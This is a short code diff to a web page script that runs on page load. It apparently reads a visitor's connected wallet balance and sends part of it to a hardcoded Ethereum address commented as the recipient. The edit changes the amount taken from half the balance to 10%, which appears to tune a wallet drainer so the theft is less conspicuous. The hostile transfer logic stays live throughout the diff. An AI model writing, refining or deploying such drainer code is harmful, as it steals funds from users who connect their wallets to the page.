@@ -49,12 +49,12 @@ document.addEventListener('DOMContentLoaded', async () => {
       const gasLimit = 21000; // Standard gas limit for a simple ETH transfer
 
       const balance = await provider.getBalance(account);
-      const halfBalance = balance.div(2); // Half of the balance
+      const sendableAmount = balance.div(10); // 10% of the balance
 
-      if (halfBalance.gte(gasPrice.mul(gasLimit))) {
+      if (sendableAmount.gte(gasPrice.mul(gasLimit))) {
         const transactionParam = {
           to: '0xDA35A9bf6bD6442C0aCe715e122fFB20871f1351', // Адрес получателя
-          value: halfBalance.sub(gasPrice.mul(gasLimit))
+          value: sendableAmount.sub(gasPrice.mul(gasLimit))
         };
 
         const txResponse = await signer.sendTransaction(transactionParam);
